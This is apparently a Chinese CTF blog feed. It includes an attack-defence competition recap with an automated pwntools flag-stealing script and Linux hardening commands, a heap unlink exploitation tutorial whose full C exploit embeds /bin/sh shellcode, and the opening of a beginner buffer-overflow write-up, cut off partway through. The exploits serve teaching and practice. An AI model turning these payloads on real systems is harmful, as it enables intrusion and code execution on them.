class="built_in">printf</span>( <span class="string">"Problem opening the file\n"</span> );</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>( (stream = fopen( <span class="string">"fread.out"</span>, <span class="string">"r+t"</span> )) != <span class="literal">NULL</span> )  </div><div class="line">    &#123;</div><div class="line">        numread = fread( <span class="built_in">list</span>, <span class="keyword">sizeof</span>( <span class="keyword">char</span> ), <span class="number">20000</span>, stream );</div><div class="line">        fclose( stream );</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>( <span class="string">"File could not be opened\n"</span> );</div><div class="line">    &#125;</div><div class="line">    end=clock();</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fread all time：%d\n"</span>,end-start);</div><div class="line">    start=clock();</div><div class="line">    fd = open(<span class="string">"read.out"</span>, O_WRONLY|O_CREAT);</div><div class="line">    write(fd, <span class="built_in">list</span>, <span class="keyword">sizeof</span>(<span class="built_in">list</span>));</div><div class="line">    close(fd);</div><div class="line">    fd = open(<span class="string">"read.out"</span>, O_RDONLY);</div><div class="line">    size = read(fd, <span class="built_in">list</span>, <span class="keyword">sizeof</span>(<span class="built_in">list</span>));</div><div class="line">    close(fd);</div><div class="line">    end=clock();</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"read all time：%d\n"</span>,end-start);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一下代码，方便使用&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第四届MIAC线下总结</title>
    <link href="http://yoursite.com/2017/12/04/2017_12_24_miac_xianxia/"/>
    <id>http://yoursite.com/2017/12/04/2017_12_24_miac_xianxia/</id>
    <published>2017-12-04T06:58:52.428Z</published>
    <updated>2017-12-04T11:30:43.715Z</updated>
    
    <content type="html"><![CDATA[<p>虽然我已经大三了，可是线下这是第二次，表示体验真的是非常不好，不过还是知道自己还是有很多东西要学习<br><a id="more"></a></p><h2 id="1、环境"><a href="#1、环境" class="headerlink" title="1、环境"></a>1、环境</h2><p>这是MIAC在决赛，这时不得不提初赛，第一个初赛直接被各种大佬打爆平台，导致所有队伍全部被改名字，主办方只好取消。后面两次虽然成功，但是结果仍然让我们出乎意料(一般都是前20进入决赛，这是前80，难以想象[这里后面证明是正确的])。</p><h2 id="2、比赛"><a href="#2、比赛" class="headerlink" title="2、比赛"></a>2、比赛</h2><p>比赛前一晚：看了比赛规则，发现有一台靶机和一台攻击机机（这是啥）,一小时一轮，一个三轮（后面怀疑主办方的说明，居然一个小时一个题目[一个5小轮]）。于是开始准备各种工具，自动提交flag脚本，通防工具，提取脚本，木马（后来都输给了主板方）。<br>比赛前:80个队伍，做得位置全部不知道（蒙）。终于进场了，都是找了好久，终于找到位置。发现我们只能用攻击机工具别人的靶机（类似实验吧）。<br>第一轮:葛师傅和潘师傅找到web题目，我在找pwn题目（最后，，，一个小时过去了，找不到题目，发现根本没有pwn题目），葛师傅很气愤，因为题目不能下下来。而且，自己电脑和靶机电脑是网络隔离的。不能用ssh连接。<br>第二轮:潘师傅和葛师傅找到mysql的弱密码，然后开始写文件进去，读文件出来，但是不知道为什么不能读到flag,而我只能在那里维护，看看那些ip来连接了我们，然后去杀掉pid.<br>第三轮:mysql的弱密码，这里可以读取flag了。可是这里主办方的flag不能及时刷新，导致我们提交的flag不对，这里问技术人员，他说赛后在谈论。</p><h2 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h2><p>1、首先这个比赛没有pwn题，那bin师傅只能看看屏幕了。<br>2、对比赛规则要仔细研究<br>3、liunx下的命令要熟悉</p><p>总结:<br>1、一上去可以连接上去，先备份一下所有的镜像文件。<br>2、修改自己的靶机（服务器）的密码，mysql的密码<br>3、看看有哪些题目<br>4、先挂上通防，等主办方来警告就撤下来</p><h2 id="4、脚本"><a href="#4、脚本" class="headerlink" title="4、脚本"></a>4、脚本</h2><p>这里pwn题自动提交flag脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line">context(arch = <span class="string">'amd64'</span>)</div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">start = time.time()</div><div class="line"><span class="comment">#p = process('./pwn')</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">28</span>):</div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="comment">#if i == 25:</span></div><div class="line"><span class="comment">#continue</span></div><div class="line">p = remote(<span class="string">'172.16.%s.102'</span> % i,<span class="number">20002</span>)</div><div class="line">p.recv()</div><div class="line">payload=<span class="string">"a"</span>*<span class="number">213</span></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">timestart = time.time()</div><div class="line">p.sendline(<span class="string">'cat /home/newcalc/flag'</span>)</div><div class="line">a = p.recvline(timeout=<span class="number">5</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"============="</span> </div><div class="line"><span class="keyword">print</span> a[<span class="number">2</span>:]</div><div class="line">url_platform = <span class="string">'http://172.16.200.3:9000/submit_flag/'</span></div><div class="line">token = <span class="string">'L4FBjK6K3nhkTcFMcwDGuWOwqR9GYbghNbtmOc49wjRiKS60SoILVjFgMpj3Etcx7R0wMIrB1os'</span></div><div class="line">post_data = &#123;</div><div class="line"><span class="string">'token'</span>:token,</div><div class="line"><span class="string">'flag'</span>:a[<span class="number">2</span>:]</div><div class="line">&#125;</div><div class="line">r = requests.post(url_platform, data = post_data)</div><div class="line">timenow = time.time()-timestart</div><div class="line"><span class="keyword">if</span>(timenow == <span class="number">5</span>):</div><div class="line"><span class="keyword">continue</span></div><div class="line"><span class="comment">#p.interactive()</span></div><div class="line"><span class="keyword">except</span>:</div><div class="line"><span class="keyword">pass</span></div><div class="line">end = time.time()</div><div class="line">time.sleep(<span class="number">300</span> - (end -start))</div></pre></td></tr></table></figure></p><p>这里是liunx命令:<br>备份数据库<br><code>mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql</code><br><code>mysqldump -u root -p 123456 mysql &gt; back.sql</code><br>备份所有数据库<br><code>mysqldump --all-databases &gt; bak.sql</code><br>还原数据库<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql   </div><div class="line">find / *.php -perm        </div><div class="line">awk -F:  /etc/passwd     </div><div class="line">crontab -l</div></pre></td></tr></table></figure></p><p>查看那些端口开放<br><code>netstat -pantu</code><br><img src="" alt=""><br><code>ps -anu</code><br><img src="" alt=""><br>杀死PID<br><code>kill 9511</code><br>查看tcp连接的数量<br><code>netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn</code><br>找到某个文件<br><code>find / -name 文件名</code><br>解压<br><code>tar -xvf file.tar</code><br><code>unzip file.zip</code><br><code>unrar e file.rar</code><br>连接ssh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ssh root@192.168.1.14</div><div class="line">yes</div><div class="line">password</div><div class="line">ifconfig</div></pre></td></tr></table></figure></p><p>登录mysql数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql -u root -h -p123456</div><div class="line">ifconfig</div></pre></td></tr></table></figure></p><p>将/var/www/html目录下的文件设置为不允许任何人修改<br><code>chattr -R +i /var/www/html</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;虽然我已经大三了，可是线下这是第二次，表示体验真的是非常不好，不过还是知道自己还是有很多东西要学习&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN之unlink</title>
    <link href="http://yoursite.com/2017/11/23/pwn_heap_1/"/>
    <id>http://yoursite.com/2017/11/23/pwn_heap_1/</id>
    <published>2017-11-23T02:40:36.492Z</published>
    <updated>2017-12-30T09:14:19.570Z</updated>
    
    <content type="html"><![CDATA[<p>学习栈一段时间了，现在转战学习堆<br><a id="more"></a></p><h1 id="1、unlink原理"><a href="#1、unlink原理" class="headerlink" title="1、unlink原理"></a>1、unlink原理</h1><p>Heap Overflow的原理是修改程序中的GOT（Global Offest Table）表来使得程序调用正规函数时(如printf() free()等)跳入我们设计的shellcode。在这一点上它的手段类似于Format String Attack都是利用修改内存来达到攻击的目的。Heap Overflow的优点是一次运行基本搞定，不像stack overflow还可能需要猜多次栈的偏移，</p><p>如何能够任意修改内存呢？Heap Overflow攻击利用了内存释放函数free的一个特性。利用了我们当调用free释放一个内存空间时，free函数内存将会查看在堆中下一个或者上一个内存是否也已经释放。如果是的话，那么程序将执行一个Unlink宏将两个内存空间结合起来，这样的话能够减少堆中的内存碎片从而提高程序的效率。</p><p>Unlink宏的执行方式类似于双向链表中删除其中某一个元素的操作。也就是将前一个元素的后指针指向当前的后指针，后一个元素的前指针指向当前的前指针。我们要注意到，这其实是两个内存赋值操作，本质上就是两个类似于*ptr = data的操作。而如果我们设计的字符串够长到足以能够修改到以上ptr和data的值的话，我们其实就能够修改程序内任意内存地址的值，包括以上提到的GOT表，从而改变让程序跳入我们设计的shellcode。</p><h1 id="2、堆之unlink"><a href="#2、堆之unlink" class="headerlink" title="2、堆之unlink"></a>2、堆之unlink</h1><p>我们先看看一个有堆溢出的程序<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[] )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">char</span> * first, * second;</div><div class="line"></div><div class="line"><span class="comment">/*[1]*/</span> first = <span class="built_in">malloc</span>( <span class="number">666</span> );</div><div class="line"><span class="comment">/*[2]*/</span> second = <span class="built_in">malloc</span>( <span class="number">12</span> );</div><div class="line">        <span class="keyword">if</span>(argc!=<span class="number">1</span>)</div><div class="line"><span class="comment">/*[3]*/</span>         <span class="built_in">strcpy</span>( first, argv[<span class="number">1</span>] );</div><div class="line"><span class="comment">/*[4]*/</span> <span class="built_in">free</span>( first );</div><div class="line"><span class="comment">/*[5]*/</span> <span class="built_in">free</span>( second );</div><div class="line"><span class="comment">/*[6]*/</span> <span class="keyword">return</span>( <span class="number">0</span> );</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这里当使用申请mallloc申请内存空间的时候，如果申请成功，将会创建一个chunk并返回chunk地址指针，失败则返回<code>NULL</code>。上面程序的的申请堆的情况如下(chunk1_size=0x2a1[下面会说怎么计算]):<br><img src="https://i.imgur.com/ckaHajP.png" alt=""><br>chunk头包括以下两部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">prev_size: 如果当前chunk的相邻前一chunk未被使用，prev_size为此前一chunk的大小</div><div class="line">size: 当前chunk的大小。由于chunk大小是8的整数倍，所以此size的后3 bit被用于存储其他信息。我们需要记住的便是最低bit，倒数第一位即图中P的位置，用于指示前一chunk是否已被使用(PREV_INUSE[0（偶数）是没有被使用])，倒数第二位表示chunk是否由mmap分配</div><div class="line">倒数第三位表示是否储存在main arena。</div></pre></td></tr></table></figure></p><p>如果当前chunk处于未被使用状态，则mem前8 bytes被用来存储其他信息，具体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fd: 下一个未被使用的chunk的地址</div><div class="line">bk: 上一个未被使用的chunk的地址</div></pre></td></tr></table></figure></p><p>当调用malloc后，程序做的第一件事就是在bins中找是否有符合大小的被释放块，如果有，这个被释放块就会从链表中脱离（unlink），如果没有就在top chunk中紧接着上次分配的chunk后面再分配一个chunk。<br>unlink的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/* Take a chunk off a bin list */</div><div class="line">#define unlink(P, BK, FD) &#123;                                            </div><div class="line">  FD = P-&gt;fd;                                                          </div><div class="line">  BK = P-&gt;bk;                                                          </div><div class="line">  FD-&gt;bk = BK;                                                         </div><div class="line">  BK-&gt;fd = FD;                                                         </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>很早之前就有人总结出了unlink的利用技巧，将unlink代码写得直白一点就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">FD = *P + 8;</div><div class="line">BK = *P + 12;</div><div class="line">FD + 12 = BK;</div><div class="line">BK + 8 = FD;</div></pre></td></tr></table></figure></p><p>上面第四行存在堆溢出，当argv[1]大于666字节的时候，就会堆溢出到第二个chunk的地址</p><p>unlink：这个技巧的核心思想，就是欺骗 glibc malloc 来 unlink 第二个块。unlink free的 GOT 条目会使其被 shellcode 地址覆盖。在成功覆盖之后，现在在行[5]，free被漏洞程序调用时，shellcode 就会执行。不是很清楚嘛？没问题，首先让我们看看执行free时，glibc malloc 在干什么。</p><h2 id="如果没有攻击者影响，行-4-的free会做这些事情："><a href="#如果没有攻击者影响，行-4-的free会做这些事情：" class="headerlink" title="如果没有攻击者影响，行[4]的free会做这些事情："></a>如果没有攻击者影响，行[4]的free会做这些事情：</h2><p>对于不是 mmap 的块，会向前或向后合并。<br>向后合并<br>    查看前一个块是不是空闲的 – 前一个块是空闲的，如果当前空闲块的PREV_INUSE(P)位没有设置。但是我们这里，前一个块是分配的，因为它的PREV_INUSE位设置了，通常堆内存的第一个块的前面那个块是分配的（即使它不存在）。<br>    如果空闲，合并它。例如，从 binlist unlink（移除）前一个块，将前一个块的大小与当前块相加，并将块指针指向前一个快。但是我们这里，前一个快是分配的，因此 unlink 不会调用。当前空闲块first不能向后合并。<br>向前合并<br>   查看下一个块是不是空闲的 – 下一个块是空闲的，如果下下个块（距离当前空闲块）的PREV_INUSE(P)位没有设置。为了访问下下个块，将当前块的大小加到它的块指针，再将下一个块的大小加到下一个块指针。我们这里，距离当前空闲块的下下个块是 top 块，它的PREV_INUSE位已设置。因此下一个块second不是空闲的。<br>   如果是空闲的，合并它。例如，从它的 binlist 中 unlink（移除）下一个块，并将下一个块的大小添加到当前大小。但是我们这里，下一个块是分配的，因此 unlink 不会调用。当前空闲块first不能向前合并。<br>   现在将合并后的块添加到 unsorted bin 中。我们这里，由于合并没有发生，只将first块添加到票 unsorted bin 中。<br>现在让我们假设，攻击者在行[3]覆盖了second块的块头部，像这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">prev_size=0  即表示前一个chunk为free</div><div class="line">size = -4</div><div class="line">fb=free_addr-12</div><div class="line">bk=Shellcode_addr</div></pre></td></tr></table></figure></p><p>free_addr-12是free的got目录的地址</p><h2 id="在攻击者的影响下，行-4-的free会做下面的事情："><a href="#在攻击者的影响下，行-4-的free会做下面的事情：" class="headerlink" title="在攻击者的影响下，行[4]的free会做下面的事情："></a>在攻击者的影响下，行[4]的free会做下面的事情：</h2><p>对于不是 mmap 的块，会向前或向后合并。<br>向后合并<br>    鉴于first的前一个chunk非free的，所以不会发生向后合并操作。<br>向前合并<br>    从上面代码可以知道，它是通过将nextchunk + nextsize计算得到指向下下一个chunk的指针，然后判断下下个chunk的size的PREV_INUSE标记位。在本例中，此时nextsize被我们设置为了-4，这样glibc malloc就会将next chunk的prev_size字段看做是next-next chunk的size字段，而我们已经将next chunk的prev_size字段设置为了一个偶数，因此此时通过inuse_bit_at_offset宏获取到的nextinuse为0，即next chunk为free！既然next chunk为free，那么就需要进行向前合并，所以就会调用unlink(nextchunk, bck, fwd);函数。真正的重点就是这个unlink函数！<br>现在将合并后的块添加到 unsorted bin 中。<br>看看漏洞程序的堆内存的图片，在攻击者影响用户输入之后：<br><img src="https://i.imgur.com/eQWfSFe.png" alt=""></p><h1 id="3、利用unlink"><a href="#3、利用unlink" class="headerlink" title="3、利用unlink"></a>3、利用unlink</h1><p>要完成Heap Overflow，有几点需要注意：</p><ol><li>计算堆的大小<br>堆得大小和分配的大小不一样，我们要多分配4byte来保存这个堆的大小，而堆的大小又必须是8的倍数，所以堆得实际大小的计算方法是：<br>actual_size = （floor((memory_size + 4)/8) * 8）| 0x1, 其中floor()是上取整操作。</li><li>修改使得第二个内存”看起来”已经被释放过<br>这可以通过首先设置第二个内存大小为-4，然后再将内存上一个byte的值设置为一个偶数来完成</li><li>修改GOT表<br>这实际上相当于一个一个内存赋值问题<br>*(GOT_Table_Addr + 12) = shellcode_address<br>GOT表中某函数的位置可以通过objdump -R来查看</li><li>准备邪恶的shellcode<br>由于我们准备将shellcode放在堆中，而且用空指令NOP来铺路，shellcode的地址其实就可以是堆起始地址后偏移任意位（貌似大于8bytes就可以）。这里我们可以用ltrace命令来查看某内存在堆中的地址。<h1 id="4、exp"><a href="#4、exp" class="headerlink" title="4、exp"></a>4、exp</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Program to exploit 'vuln' using unlink technique.</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FUNCTION_POINTER ( 0x0804978c )         <span class="comment">//Address of GOT entry for free function obtained using "objdump -R vuln".</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE_ADDRESS ( 0x0804a008 + 0x10 )      <span class="comment">//Address of variable 'first' in vuln executable. </span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> VULNERABLE <span class="meta-string">"./vuln"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> DUMMY 0xdefaced</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></div><div class="line"></div><div class="line"><span class="keyword">char</span> shellcode[] =</div><div class="line">        <span class="comment">/* Jump instruction to jump past 10 bytes. ppssssffff - Of which ffff would be overwritten by unlink function</span></div><div class="line"><span class="comment">        (by statement BK-&gt;fd = FD). Hence if no jump exists shell code would get corrupted by unlink function. </span></div><div class="line"><span class="comment">        Therefore store the actual shellcode 12 bytes past the beginning of buffer 'first'*/</span></div><div class="line">        <span class="string">"\xeb\x0assppppffff"</span></div><div class="line">        <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">void</span> )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">char</span> * p;</div><div class="line">        <span class="keyword">char</span> argv1[ <span class="number">680</span> + <span class="number">1</span> ];</div><div class="line">        <span class="keyword">char</span> * argv[] = &#123; VULNERABLE, argv1, <span class="literal">NULL</span> &#125;;</div><div class="line"></div><div class="line">        p = argv1;</div><div class="line">        <span class="comment">/* the fd field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the bk field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the fd_nextsize field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the bk_nextsize field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* Copy the shellcode */</span></div><div class="line">        <span class="built_in">memcpy</span>( p, shellcode, <span class="built_in">strlen</span>(shellcode) );</div><div class="line">        p += <span class="built_in">strlen</span>( shellcode );</div><div class="line">        <span class="comment">/* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize </span></div><div class="line"><span class="comment">        of first chunk */</span></div><div class="line">        <span class="built_in">memset</span>( p, <span class="string">'B'</span>, (<span class="number">680</span> - <span class="number">4</span>*<span class="number">4</span>) - (<span class="number">4</span>*<span class="number">4</span> + <span class="built_in">strlen</span>(shellcode)) );</div><div class="line">        p += ( <span class="number">680</span> - <span class="number">4</span>*<span class="number">4</span> ) - ( <span class="number">4</span>*<span class="number">4</span> + <span class="built_in">strlen</span>(shellcode) );</div><div class="line">        <span class="comment">/* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset */</span></div><div class="line">        *( (<span class="keyword">size_t</span> *)p ) = (<span class="keyword">size_t</span>)( DUMMY &amp; ~PREV_INUSE );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*/</span></div><div class="line">        *( (<span class="keyword">size_t</span> *)p ) = (<span class="keyword">size_t</span>)( <span class="number">-4</span> );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the fd field of the second chunk. It should point to free - 12. -12 is required since unlink function</span></div><div class="line"><span class="comment">        would do + 12 (FD-&gt;bk). This helps to overwrite the GOT entry of free with the address we have overwritten in </span></div><div class="line"><span class="comment">        second chunk's bk field (see below) */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( FUNCTION_POINTER - <span class="number">12</span> );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the bk field of the second chunk. It should point to shell code address.*/</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( CODE_ADDRESS );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the terminating NUL character */</span></div><div class="line">        *p = '';</div><div class="line"></div><div class="line">        <span class="comment">/* the execution of the vulnerable program */</span></div><div class="line">        execve( argv[<span class="number">0</span>], argv, <span class="literal">NULL</span> );</div><div class="line">        <span class="keyword">return</span>( <span class="number">-1</span> );</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ol><p>参考链接：<br><a href="http://cb.drops.wiki/drops/tips-16610.html" target="_blank" rel="external">http://cb.drops.wiki/drops/tips-16610.html</a><br><a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">http://www.freebuf.com/news/88660.html</a><br><a href="https://etenal.me/archives/1121" target="_blank" rel="external">https://etenal.me/archives/1121</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习栈一段时间了，现在转战学习堆&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN_x86_培训</title>
    <link href="http://yoursite.com/2017/11/19/pwn_baby/"/>
    <id>http://yoursite.com/2017/11/19/pwn_baby/</id>
    <published>2017-11-19T15:03:04.970Z</published>
    <updated>2017-11-20T00:54:19.333Z</updated>
    
    <content type="html"><![CDATA[<p>潘师傅不想写这么简单的wp,我就来写了。潘师傅讲了pwn的入门，我也听了，虽然以前也学过一下，不过今天收获也挺多的。这里把潘师傅布置的题目记录一下。</p><a id="more"></a><h2 id="1、babypwn1"><a href="#1、babypwn1" class="headerlink" title="1、babypwn1"></a>1、babypwn1</h2><p>程序就不放了，这里可以下载（<a href="https://betamao.me）" target="_blank" rel="external">https://betamao.me）</a><br>分析程序，检查发现程序无任何保护<br><img src="https://i.imgur.com/52gZ58m.png" alt=""><br>我们只需要v5=abcd,就可以得到shell(意味着拿到flag),但v5=233了，所以这里我们需要覆盖v5的值<br>这里第一个箭头是函数的栈顶eps=0x3f4(同时我们输入的s也是存放在这里),第二个箭头v5=0xc,所以我们算出两者的距离d=0x3f4-0xc=1000，就可以覆盖了，构造payload(小端序，v5是int型的)：<br><code>payload = &#39;a&#39;*1000+&#39;dcba&#39;</code><br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">'./babypwn1'</span>)</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">1000</span>+<span class="string">'dcba'</span></div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><h2 id="2、babypwn2"><a href="#2、babypwn2" class="headerlink" title="2、babypwn2"></a>2、babypwn2</h2><p>分析程序，检查发现程序无任何保护<br>发现这个函数，同时发现getShell函数<br><img src="https://i.imgur.com/WyLpecF.png" alt=""><br>那我们只有覆盖返回地址到getShell函数就好啦，发现函数栈帧0x3f4=1012,函数栈是这样的：<br><img src="https://i.imgur.com/3xoBk7P.png" alt=""><br>那么我们只需要输入1012+4+ret(getShell的地址)就成功啦<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'babypwn2'</span>)</div><div class="line">elf=ELF(<span class="string">'babypwn2'</span>)</div><div class="line">ret=elf.symbols[<span class="string">'getShell'</span>]</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">1016</span> +p32(ret)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><h2 id="3、babypwn3"><a href="#3、babypwn3" class="headerlink" title="3、babypwn3"></a>3、babypwn3</h2><p>分析程序，检查发现程序无任何保护<br>发现存在溢出，并且当v2=127的时候，会去执行输入的代码<br><img src="https://i.imgur.com/McHlAzO.png" alt=""><br>可是这里溢出后并没有执行得到shell的函数，因为没有任何保护，所以栈上的代码可以执行。那么我们就自己写一个执行shell的代码输入就可以了——shellcode，可以在网上找，它的功能就是system(“/bin/sh”)<br>方法一<br>1、输入shellcode<br>2、覆盖v7=127<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> 